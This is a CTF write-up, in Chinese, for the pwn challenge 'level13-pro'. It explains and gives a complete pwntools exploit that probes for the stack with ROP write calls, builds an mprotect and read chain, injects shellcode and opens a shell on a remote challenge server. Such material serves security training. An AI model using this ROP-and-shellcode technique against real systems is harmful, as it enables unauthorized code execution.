# level13-pro
### 思路：
1. 这道题和level11很像，但区别是，buffer大小只有0x24,有效控制的只有0x14,即只有5个整数
2. 解决方案为，利用5个整数，进行一次读操作将后面后续的rop链读到溢出区域的后面
3. 第二步若要进行读操作，必须知道当前esp的地址，获得esp地址的方法: 
* 在前0x10个输入中作标记
* 利用5个整数在栈上写操作，获得写出的值，并查看标记是否存在以及存在的位置
* 循环进行， 直到得到mark的位置，根据这个位置，容易推算出下一步我们需要读的位置
* 注：写操作完成后，需要跳到bug函数(0x804811e)

```python
from pwn import *
context.log_level = "debug"
pwn_file = "./level13-pro"

def debug():
    log.debug("process pid:%d"%r.pid)
    pause()

inject_pos = 0x8048500
eax_val = 0x7d
ebx_val = 0x8048000
ecx_val = 0x1000
edx_val = 0x7

ris_call   = 0x80480fe
read_addr  = 0x80480E1
write_addr = 0x80480F9
bug_func = 0x804811e
next_pos   = 0x804817C

mark = "I'm your father."
print len(mark)
def detect_stack(r,detect_addr):
    rop = [mark, p32(write_addr),p32(bug_func),p32(1),p32(detect_addr),p32(0x800)]
    payload = ''.join(rop)
    
    r.sendafter("ROP like a PRO:",payload)
    a = r.recvuntil("Good Luck!\n")
    print a
    try:
        words=r.recv()
        if words.find(mark)>=0:
            print "===================="
            return detect_addr + words.find(mark)
        else:
            r.close()
            return -1
    except:
        r.close()
        return -1

stack_base = 0xff800000
for i in range(0x1000):
    detect_addr = stack_base + i*0x800
    r= remote("pwn.sixstars.team",22013)#r = process("./level13-pro")
    stack_addr = detect_stack(r, detect_addr)
    if stack_addr>=0:
        print "======the stack in use is======"
        print hex(stack_addr)
        break

sh = asm(shellcraft.sh())
rop2 = ['a'*0x14,p32(write_addr),p32(next_pos),p32(1),p32(ebx_val),p32(eax_val),
        'a'*0x14,p32(ris_call), p32(next_pos),p32(ebx_val),p32(ecx_val),p32(edx_val),
        'a'*0x14,p32(read_addr),p32(inject_pos),p32(0),p32(inject_pos),p32(0x100)]
payload2 = ''.join(rop2)

rop1 = ['a'*0x10, p32(read_addr),p32(next_pos),p32(0),p32(stack_addr+0x24+8) ,p32(len(payload2)) ]
payload1 = ''.join(rop1)

r.send(payload1)
r.send(payload2)

r.recv(0x7d)

r.sendline(sh)
r.interactive()
```